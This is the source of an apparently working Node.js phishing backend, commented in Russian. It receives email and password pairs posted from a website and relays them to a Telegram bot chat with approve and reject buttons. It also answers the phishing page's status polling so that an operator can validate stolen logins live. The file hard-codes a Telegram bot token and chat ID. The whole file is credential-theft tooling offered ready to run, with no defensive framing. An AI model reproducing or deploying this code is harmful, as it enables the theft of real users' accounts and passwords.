const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors({ origin: '*' })); // Разрешаем запросы с любых адресов

const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
const chatId = '-1003894478662';

let requests = {}; // Память сервера для статусов

// Проверка работы сервера (открой ссылку сервера в браузере)
app.get('/', (req, res) => {
    res.send('Сервер запущен и готов к работе!');
});

// Прием данных с сайта
app.post('/send-data', async (req, res) => {
    const { userId, email, pass } = req.body;
    console.log(`[САЙТ] Получены данные от ${userId}: ${email}`);
    
    requests[userId] = 'pending';

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Ок", callback_data: `approve_${userId}` },
                        { text: "❌ Ошибка", callback_data: `reject_${userId}` }
                    ]
                ]
            }
        });
        res.json({ status: 'sent' });
    } catch (error) {
        console.error('[ТЕЛЕГРАМ] Ошибка отправки:', error.message);
        res.status(500).json({ error: 'Ошибка при связи с ботом' });
    }
});

// Проверка статуса (сайт спрашивает это каждые 3 сек)
app.get('/check-status/:userId', (req, res) => {
    const status = requests[req.params.userId] || 'pending';
    res.json({ status });
});

// Обработка кнопок из Телеграм
app.post('/tg-webhook', async (req, res) => {
    if (req.body.callback_query) {
        const callbackData = req.body.callback_query.data;
        const [action, userId] = callbackData.split('_');

        console.log(`[АДМИН] Нажата кнопка ${action} для ${userId}`);

        if (action === 'approve') {
            requests[userId] = 'success';
        } else {
            requests[userId] = 'error';
        }

        // Уведомление для админа в ТГ
        await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            callback_query_id: req.body.callback_query.id,
            text: "Статус обновлен!"
        });
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
